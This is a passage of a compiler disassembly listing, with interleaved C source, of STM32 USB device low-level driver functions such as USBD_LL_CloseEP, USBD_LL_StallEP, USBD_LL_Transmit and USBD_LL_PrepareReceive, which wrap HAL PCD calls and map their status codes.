 800cd28:	a201      	add	r2, pc, #4	; (adr r2, 800cd30 <USBD_LL_OpenEP+0x44>)
 800cd2a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd2e:	bf00      	nop
 800cd30:	0800cd41 	.word	0x0800cd41
 800cd34:	0800cd47 	.word	0x0800cd47
 800cd38:	0800cd4d 	.word	0x0800cd4d
 800cd3c:	0800cd53 	.word	0x0800cd53
    case HAL_OK :
      usb_status = USBD_OK;
 800cd40:	2300      	movs	r3, #0
 800cd42:	73fb      	strb	r3, [r7, #15]
    break;
 800cd44:	e00b      	b.n	800cd5e <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd46:	2303      	movs	r3, #3
 800cd48:	73fb      	strb	r3, [r7, #15]
    break;
 800cd4a:	e008      	b.n	800cd5e <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd4c:	2301      	movs	r3, #1
 800cd4e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd50:	e005      	b.n	800cd5e <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd52:	2303      	movs	r3, #3
 800cd54:	73fb      	strb	r3, [r7, #15]
    break;
 800cd56:	e002      	b.n	800cd5e <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cd58:	2303      	movs	r3, #3
 800cd5a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd5c:	bf00      	nop
  }
  return usb_status;
 800cd5e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd60:	4618      	mov	r0, r3
 800cd62:	3710      	adds	r7, #16
 800cd64:	46bd      	mov	sp, r7
 800cd66:	bd80      	pop	{r7, pc}

0800cd68 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd68:	b580      	push	{r7, lr}
 800cd6a:	b084      	sub	sp, #16
 800cd6c:	af00      	add	r7, sp, #0
 800cd6e:	6078      	str	r0, [r7, #4]
 800cd70:	460b      	mov	r3, r1
 800cd72:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd74:	2300      	movs	r3, #0
 800cd76:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd78:	2300      	movs	r3, #0
 800cd7a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cd7c:	687b      	ldr	r3, [r7, #4]
 800cd7e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd82:	78fa      	ldrb	r2, [r7, #3]
 800cd84:	4611      	mov	r1, r2
 800cd86:	4618      	mov	r0, r3
 800cd88:	f7f5 fb07 	bl	800239a <HAL_PCD_EP_Close>
 800cd8c:	4603      	mov	r3, r0
 800cd8e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd90:	7bbb      	ldrb	r3, [r7, #14]
 800cd92:	2b03      	cmp	r3, #3
 800cd94:	d816      	bhi.n	800cdc4 <USBD_LL_CloseEP+0x5c>
 800cd96:	a201      	add	r2, pc, #4	; (adr r2, 800cd9c <USBD_LL_CloseEP+0x34>)
 800cd98:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd9c:	0800cdad 	.word	0x0800cdad
 800cda0:	0800cdb3 	.word	0x0800cdb3
 800cda4:	0800cdb9 	.word	0x0800cdb9
 800cda8:	0800cdbf 	.word	0x0800cdbf
    case HAL_OK :
      usb_status = USBD_OK;
 800cdac:	2300      	movs	r3, #0
 800cdae:	73fb      	strb	r3, [r7, #15]
    break;
 800cdb0:	e00b      	b.n	800cdca <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cdb2:	2303      	movs	r3, #3
 800cdb4:	73fb      	strb	r3, [r7, #15]
    break;
 800cdb6:	e008      	b.n	800cdca <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cdb8:	2301      	movs	r3, #1
 800cdba:	73fb      	strb	r3, [r7, #15]
    break;
 800cdbc:	e005      	b.n	800cdca <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdbe:	2303      	movs	r3, #3
 800cdc0:	73fb      	strb	r3, [r7, #15]
    break;
 800cdc2:	e002      	b.n	800cdca <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cdc4:	2303      	movs	r3, #3
 800cdc6:	73fb      	strb	r3, [r7, #15]
    break;
 800cdc8:	bf00      	nop
  }
  return usb_status;
 800cdca:	7bfb      	ldrb	r3, [r7, #15]
}
 800cdcc:	4618      	mov	r0, r3
 800cdce:	3710      	adds	r7, #16
 800cdd0:	46bd      	mov	sp, r7
 800cdd2:	bd80      	pop	{r7, pc}

0800cdd4 <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cdd4:	b580      	push	{r7, lr}
 800cdd6:	b084      	sub	sp, #16
 800cdd8:	af00      	add	r7, sp, #0
 800cdda:	6078      	str	r0, [r7, #4]
 800cddc:	460b      	mov	r3, r1
 800cdde:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cde0:	2300      	movs	r3, #0
 800cde2:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cde4:	2300      	movs	r3, #0
 800cde6:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cde8:	687b      	ldr	r3, [r7, #4]
 800cdea:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdee:	78fa      	ldrb	r2, [r7, #3]
 800cdf0:	4611      	mov	r1, r2
 800cdf2:	4618      	mov	r0, r3
 800cdf4:	f7f5 fc66 	bl	80026c4 <HAL_PCD_EP_Flush>
 800cdf8:	4603      	mov	r3, r0
 800cdfa:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cdfc:	7bbb      	ldrb	r3, [r7, #14]
 800cdfe:	2b03      	cmp	r3, #3
 800ce00:	d816      	bhi.n	800ce30 <USBD_LL_FlushEP+0x5c>
 800ce02:	a201      	add	r2, pc, #4	; (adr r2, 800ce08 <USBD_LL_FlushEP+0x34>)
 800ce04:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce08:	0800ce19 	.word	0x0800ce19
 800ce0c:	0800ce1f 	.word	0x0800ce1f
 800ce10:	0800ce25 	.word	0x0800ce25
 800ce14:	0800ce2b 	.word	0x0800ce2b
    case HAL_OK :
      usb_status = USBD_OK;
 800ce18:	2300      	movs	r3, #0
 800ce1a:	73fb      	strb	r3, [r7, #15]
    break;
 800ce1c:	e00b      	b.n	800ce36 <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce1e:	2303      	movs	r3, #3
 800ce20:	73fb      	strb	r3, [r7, #15]
    break;
 800ce22:	e008      	b.n	800ce36 <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce24:	2301      	movs	r3, #1
 800ce26:	73fb      	strb	r3, [r7, #15]
    break;
 800ce28:	e005      	b.n	800ce36 <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce2a:	2303      	movs	r3, #3
 800ce2c:	73fb      	strb	r3, [r7, #15]
    break;
 800ce2e:	e002      	b.n	800ce36 <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce30:	2303      	movs	r3, #3
 800ce32:	73fb      	strb	r3, [r7, #15]
    break;
 800ce34:	bf00      	nop
  }
  return usb_status;
 800ce36:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce38:	4618      	mov	r0, r3
 800ce3a:	3710      	adds	r7, #16
 800ce3c:	46bd      	mov	sp, r7
 800ce3e:	bd80      	pop	{r7, pc}

0800ce40 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce40:	b580      	push	{r7, lr}
 800ce42:	b084      	sub	sp, #16
 800ce44:	af00      	add	r7, sp, #0
 800ce46:	6078      	str	r0, [r7, #4]
 800ce48:	460b      	mov	r3, r1
 800ce4a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce4c:	2300      	movs	r3, #0
 800ce4e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce50:	2300      	movs	r3, #0
 800ce52:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800ce54:	687b      	ldr	r3, [r7, #4]
 800ce56:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce5a:	78fa      	ldrb	r2, [r7, #3]
 800ce5c:	4611      	mov	r1, r2
 800ce5e:	4618      	mov	r0, r3
 800ce60:	f7f5 fb7c 	bl	800255c <HAL_PCD_EP_SetStall>
 800ce64:	4603      	mov	r3, r0
 800ce66:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce68:	7bbb      	ldrb	r3, [r7, #14]
 800ce6a:	2b03      	cmp	r3, #3
 800ce6c:	d816      	bhi.n	800ce9c <USBD_LL_StallEP+0x5c>
 800ce6e:	a201      	add	r2, pc, #4	; (adr r2, 800ce74 <USBD_LL_StallEP+0x34>)
 800ce70:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce74:	0800ce85 	.word	0x0800ce85
 800ce78:	0800ce8b 	.word	0x0800ce8b
 800ce7c:	0800ce91 	.word	0x0800ce91
 800ce80:	0800ce97 	.word	0x0800ce97
    case HAL_OK :
      usb_status = USBD_OK;
 800ce84:	2300      	movs	r3, #0
 800ce86:	73fb      	strb	r3, [r7, #15]
    break;
 800ce88:	e00b      	b.n	800cea2 <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce8a:	2303      	movs	r3, #3
 800ce8c:	73fb      	strb	r3, [r7, #15]
    break;
 800ce8e:	e008      	b.n	800cea2 <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce90:	2301      	movs	r3, #1
 800ce92:	73fb      	strb	r3, [r7, #15]
    break;
 800ce94:	e005      	b.n	800cea2 <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce96:	2303      	movs	r3, #3
 800ce98:	73fb      	strb	r3, [r7, #15]
    break;
 800ce9a:	e002      	b.n	800cea2 <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce9c:	2303      	movs	r3, #3
 800ce9e:	73fb      	strb	r3, [r7, #15]
    break;
 800cea0:	bf00      	nop
  }
  return usb_status;
 800cea2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cea4:	4618      	mov	r0, r3
 800cea6:	3710      	adds	r7, #16
 800cea8:	46bd      	mov	sp, r7
 800ceaa:	bd80      	pop	{r7, pc}

0800ceac <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ceac:	b580      	push	{r7, lr}
 800ceae:	b084      	sub	sp, #16
 800ceb0:	af00      	add	r7, sp, #0
 800ceb2:	6078      	str	r0, [r7, #4]
 800ceb4:	460b      	mov	r3, r1
 800ceb6:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ceb8:	2300      	movs	r3, #0
 800ceba:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cebc:	2300      	movs	r3, #0
 800cebe:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cec0:	687b      	ldr	r3, [r7, #4]
 800cec2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cec6:	78fa      	ldrb	r2, [r7, #3]
 800cec8:	4611      	mov	r1, r2
 800ceca:	4618      	mov	r0, r3
 800cecc:	f7f5 fba6 	bl	800261c <HAL_PCD_EP_ClrStall>
 800ced0:	4603      	mov	r3, r0
 800ced2:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ced4:	7bbb      	ldrb	r3, [r7, #14]
 800ced6:	2b03      	cmp	r3, #3
 800ced8:	d816      	bhi.n	800cf08 <USBD_LL_ClearStallEP+0x5c>
 800ceda:	a201      	add	r2, pc, #4	; (adr r2, 800cee0 <USBD_LL_ClearStallEP+0x34>)
 800cedc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cee0:	0800cef1 	.word	0x0800cef1
 800cee4:	0800cef7 	.word	0x0800cef7
 800cee8:	0800cefd 	.word	0x0800cefd
 800ceec:	0800cf03 	.word	0x0800cf03
    case HAL_OK :
      usb_status = USBD_OK;
 800cef0:	2300      	movs	r3, #0
 800cef2:	73fb      	strb	r3, [r7, #15]
    break;
 800cef4:	e00b      	b.n	800cf0e <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cef6:	2303      	movs	r3, #3
 800cef8:	73fb      	strb	r3, [r7, #15]
    break;
 800cefa:	e008      	b.n	800cf0e <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cefc:	2301      	movs	r3, #1
 800cefe:	73fb      	strb	r3, [r7, #15]
    break;
 800cf00:	e005      	b.n	800cf0e <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cf02:	2303      	movs	r3, #3
 800cf04:	73fb      	strb	r3, [r7, #15]
    break;
 800cf06:	e002      	b.n	800cf0e <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cf08:	2303      	movs	r3, #3
 800cf0a:	73fb      	strb	r3, [r7, #15]
    break;
 800cf0c:	bf00      	nop
  }
  return usb_status;
 800cf0e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cf10:	4618      	mov	r0, r3
 800cf12:	3710      	adds	r7, #16
 800cf14:	46bd      	mov	sp, r7
 800cf16:	bd80      	pop	{r7, pc}

0800cf18 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf18:	b480      	push	{r7}
 800cf1a:	b085      	sub	sp, #20
 800cf1c:	af00      	add	r7, sp, #0
 800cf1e:	6078      	str	r0, [r7, #4]
 800cf20:	460b      	mov	r3, r1
 800cf22:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cf24:	687b      	ldr	r3, [r7, #4]
 800cf26:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf2a:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cf2c:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cf30:	2b00      	cmp	r3, #0
 800cf32:	da0c      	bge.n	800cf4e <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cf34:	78fb      	ldrb	r3, [r7, #3]
 800cf36:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cf3a:	68f9      	ldr	r1, [r7, #12]
 800cf3c:	1c5a      	adds	r2, r3, #1
 800cf3e:	4613      	mov	r3, r2
 800cf40:	009b      	lsls	r3, r3, #2
 800cf42:	4413      	add	r3, r2
 800cf44:	00db      	lsls	r3, r3, #3
 800cf46:	440b      	add	r3, r1
 800cf48:	3302      	adds	r3, #2
 800cf4a:	781b      	ldrb	r3, [r3, #0]
 800cf4c:	e00b      	b.n	800cf66 <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cf4e:	78fb      	ldrb	r3, [r7, #3]
 800cf50:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cf54:	68f9      	ldr	r1, [r7, #12]
 800cf56:	4613      	mov	r3, r2
 800cf58:	009b      	lsls	r3, r3, #2
 800cf5a:	4413      	add	r3, r2
 800cf5c:	00db      	lsls	r3, r3, #3
 800cf5e:	440b      	add	r3, r1
 800cf60:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cf64:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cf66:	4618      	mov	r0, r3
 800cf68:	3714      	adds	r7, #20
 800cf6a:	46bd      	mov	sp, r7
 800cf6c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf70:	4770      	bx	lr
	...

0800cf74 <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cf74:	b580      	push	{r7, lr}
 800cf76:	b084      	sub	sp, #16
 800cf78:	af00      	add	r7, sp, #0
 800cf7a:	6078      	str	r0, [r7, #4]
 800cf7c:	460b      	mov	r3, r1
 800cf7e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cf80:	2300      	movs	r3, #0
 800cf82:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cf84:	2300      	movs	r3, #0
 800cf86:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cf88:	687b      	ldr	r3, [r7, #4]
 800cf8a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf8e:	78fa      	ldrb	r2, [r7, #3]
 800cf90:	4611      	mov	r1, r2
 800cf92:	4618      	mov	r0, r3
 800cf94:	f7f5 f97f 	bl	8002296 <HAL_PCD_SetAddress>
 800cf98:	4603      	mov	r3, r0
 800cf9a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cf9c:	7bbb      	ldrb	r3, [r7, #14]
 800cf9e:	2b03      	cmp	r3, #3
 800cfa0:	d816      	bhi.n	800cfd0 <USBD_LL_SetUSBAddress+0x5c>
 800cfa2:	a201      	add	r2, pc, #4	; (adr r2, 800cfa8 <USBD_LL_SetUSBAddress+0x34>)
 800cfa4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cfa8:	0800cfb9 	.word	0x0800cfb9
 800cfac:	0800cfbf 	.word	0x0800cfbf
 800cfb0:	0800cfc5 	.word	0x0800cfc5
 800cfb4:	0800cfcb 	.word	0x0800cfcb
    case HAL_OK :
      usb_status = USBD_OK;
 800cfb8:	2300      	movs	r3, #0
 800cfba:	73fb      	strb	r3, [r7, #15]
    break;
 800cfbc:	e00b      	b.n	800cfd6 <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cfbe:	2303      	movs	r3, #3
 800cfc0:	73fb      	strb	r3, [r7, #15]
    break;
 800cfc2:	e008      	b.n	800cfd6 <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cfc4:	2301      	movs	r3, #1
 800cfc6:	73fb      	strb	r3, [r7, #15]
    break;
 800cfc8:	e005      	b.n	800cfd6 <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cfca:	2303      	movs	r3, #3
 800cfcc:	73fb      	strb	r3, [r7, #15]
    break;
 800cfce:	e002      	b.n	800cfd6 <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cfd0:	2303      	movs	r3, #3
 800cfd2:	73fb      	strb	r3, [r7, #15]
    break;
 800cfd4:	bf00      	nop
  }
  return usb_status;
 800cfd6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cfd8:	4618      	mov	r0, r3
 800cfda:	3710      	adds	r7, #16
 800cfdc:	46bd      	mov	sp, r7
 800cfde:	bd80      	pop	{r7, pc}

0800cfe0 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800cfe0:	b580      	push	{r7, lr}
 800cfe2:	b086      	sub	sp, #24
 800cfe4:	af00      	add	r7, sp, #0
 800cfe6:	60f8      	str	r0, [r7, #12]
 800cfe8:	607a      	str	r2, [r7, #4]
 800cfea:	603b      	str	r3, [r7, #0]
 800cfec:	460b      	mov	r3, r1
 800cfee:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cff0:	2300      	movs	r3, #0
 800cff2:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cff4:	2300      	movs	r3, #0
 800cff6:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800cff8:	68fb      	ldr	r3, [r7, #12]
 800cffa:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cffe:	7af9      	ldrb	r1, [r7, #11]
 800d000:	683b      	ldr	r3, [r7, #0]
 800d002:	687a      	ldr	r2, [r7, #4]
 800d004:	f7f5 fa5a 	bl	80024bc <HAL_PCD_EP_Transmit>
 800d008:	4603      	mov	r3, r0
 800d00a:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d00c:	7dbb      	ldrb	r3, [r7, #22]
 800d00e:	2b03      	cmp	r3, #3
 800d010:	d816      	bhi.n	800d040 <USBD_LL_Transmit+0x60>
 800d012:	a201      	add	r2, pc, #4	; (adr r2, 800d018 <USBD_LL_Transmit+0x38>)
 800d014:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d018:	0800d029 	.word	0x0800d029
 800d01c:	0800d02f 	.word	0x0800d02f
 800d020:	0800d035 	.word	0x0800d035
 800d024:	0800d03b 	.word	0x0800d03b
    case HAL_OK :
      usb_status = USBD_OK;
 800d028:	2300      	movs	r3, #0
 800d02a:	75fb      	strb	r3, [r7, #23]
    break;
 800d02c:	e00b      	b.n	800d046 <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d02e:	2303      	movs	r3, #3
 800d030:	75fb      	strb	r3, [r7, #23]
    break;
 800d032:	e008      	b.n	800d046 <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d034:	2301      	movs	r3, #1
 800d036:	75fb      	strb	r3, [r7, #23]
    break;
 800d038:	e005      	b.n	800d046 <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d03a:	2303      	movs	r3, #3
 800d03c:	75fb      	strb	r3, [r7, #23]
    break;
 800d03e:	e002      	b.n	800d046 <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800d040:	2303      	movs	r3, #3
 800d042:	75fb      	strb	r3, [r7, #23]
    break;
 800d044:	bf00      	nop
  }
  return usb_status;
 800d046:	7dfb      	ldrb	r3, [r7, #23]
}
 800d048:	4618      	mov	r0, r3
 800d04a:	3718      	adds	r7, #24
 800d04c:	46bd      	mov	sp, r7
 800d04e:	bd80      	pop	{r7, pc}

0800d050 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800d050:	b580      	push	{r7, lr}
 800d052:	b086      	sub	sp, #24
 800d054:	af00      	add	r7, sp, #0
 800d056:	60f8      	str	r0, [r7, #12]
 800d058:	607a      	str	r2, [r7, #4]
 800d05a:	603b      	str	r3, [r7, #0]
 800d05c:	460b      	mov	r3, r1
 800d05e:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d060:	2300      	movs	r3, #0
 800d062:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d064:	2300      	movs	r3, #0
 800d066:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800d068:	68fb      	ldr	r3, [r7, #12]
 800d06a:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800d06e:	7af9      	ldrb	r1, [r7, #11]
 800d070:	683b      	ldr	r3, [r7, #0]
 800d072:	687a      	ldr	r2, [r7, #4]
 800d074:	f7f5 f9d9 	bl	800242a <HAL_PCD_EP_Receive>
 800d078:	4603      	mov	r3, r0
 800d07a:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d07c:	7dbb      	ldrb	r3, [r7, #22]
 800d07e:	2b03      	cmp	r3, #3
 800d080:	d816      	bhi.n	800d0b0 <USBD_LL_PrepareReceive+0x60>
 800d082:	a201      	add	r2, pc, #4	; (adr r2, 800d088 <USBD_LL_PrepareReceive+0x38>)
 800d084:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d088:	0800d099 	.word	0x0800d099
 800d08c:	0800d09f 	.word	0x0800d09f
 800d090:	0800d0a5 	.word	0x0800d0a5
 800d094:	0800d0ab 	.word	0x0800d0ab
    case HAL_OK :
      usb_status = USBD_OK;
 800d098:	2300      	movs	r3, #0
 800d09a:	75fb      	strb	r3, [r7, #23]
    break;
 800d09c:	e00b      	b.n	800d0b6 <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d09e:	2303      	movs	r3, #3
 800d0a0:	75fb      	strb	r3, [r7, #23]
    break;
 800d0a2:	e008      	b.n	800d0b6 <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d0a4:	2301      	movs	r3, #1
 800d0a6:	75fb      	strb	r3, [r7, #23]
    break;
 800d0a8:	e005      	b.n	800d0b6 <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d0aa:	2303      	movs	r3, #3
 800d0ac:	75fb      	strb	r3, [r7, #23]
    break;
 800d0ae:	e002      	b.n	800d0b6 <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800d0b0:	2303      	movs	r3, #3
 800d0b2:	75fb      	strb	r3, [r7, #23]
    break;
 800d0b4:	bf00      	nop
  }
  return usb_status;
 800d0b6:	7dfb      	ldrb	r3, [r7, #23]
}
 800d0b8:	4618      	mov	r0, r3
 800d0ba:	3718      	adds	r7, #24
 800d0bc:	46bd      	mov	sp, r7
 800d0be:	bd80      	pop	{r7, pc}

0800d0c0 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800d0c0:	b580      	push	{r7, lr}
 800d0c2:	b082      	sub	sp, #8
 800d0c4:	af00      	add	r7, sp, #0
 800d0c6:	6078      	str	r0, [r7, #4]
 800d0c8:	460b      	mov	r3, r1
 800d0ca:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800d0cc:	687b      	ldr	r3, [r7, #4]
 800d0ce:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800d0d2:	78fa      	ldrb	r2, [r7, #3]
 800d0d4:	4611      	mov	r1, r2
 800d0d6:	4618      	mov	r0, r3
 800d0d8:	f7f5 f9d8 	bl	800248c <HAL_PCD_EP_GetRxCount>
 800d0dc:	4603      	mov	r3, r0
}
 800d0de:	4618      	mov	r0, r3
 800d0e0:	3708      	adds	r7, #8
 800d0e2:	46bd      	mov	sp, r7
 800d0e4:	bd80      	pop	{r7, pc}
	...

0800d0e8 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800d0e8:	b580      	push	{r7, lr}
 800d0ea:	b082      	sub	sp, #8
 800d0ec:	af00      	add	r7, sp, #0
 800d0ee:	6078      	str	r0, [r7, #4]
 800d0f0:	460b      	mov	r3, r1
 800d0f2:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800d0f4:	78fb      	ldrb	r3, [r7, #3]
 800d0f6:	2b00      	cmp	r3, #0
 800d0f8:	d002      	beq.n	800d100 <HAL_PCDEx_LPM_Callback+0x18>
 800d0fa:	2b01      	cmp	r3, #1
 800d0fc:	d013      	beq.n	800d126 <HAL_PCDEx_LPM_Callback+0x3e>
